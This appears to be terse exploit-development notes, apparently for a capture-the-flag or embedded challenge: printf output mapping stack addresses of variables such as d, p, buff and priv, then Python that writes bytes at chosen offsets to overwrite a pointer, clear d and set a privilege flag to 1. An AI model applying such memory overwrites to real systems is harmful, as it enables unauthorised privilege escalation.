

```
printf("%x\n",&d);			2000767c
printf("%x\n",d);			0
printf("%x\n",&p);			20007680
printf("%x\n",p);			0

printf("%x\n",buff2);		20007684
printf("p %x\n",&priv);		20007678

printf("%d\n",len);			511
printf("%x\n",&len);		20007674
printf("%x\n",buff);		20007670
```



			
			import struct
			a = struct.pack('<i', -12)[::-1]
			
			for i in range(len(a)):
				set_byte(p, 644+i, a[i])
				
			# loop
			set_byte(p, 879, 1)

			# buff random byte
			set_byte(p, 719, 1)

			# addr for p
			a = b'\x74\x76\x00\x20'[::-1]
			for i in range(len(a)):
				set_byte(p, 719-1-i, a[i])

			# d
			for i in range(4):
				set_byte(p, 719-5-i, 0)

			# privilege
			for i in range(4):
				set_byte(p, 719-9-i, 1)
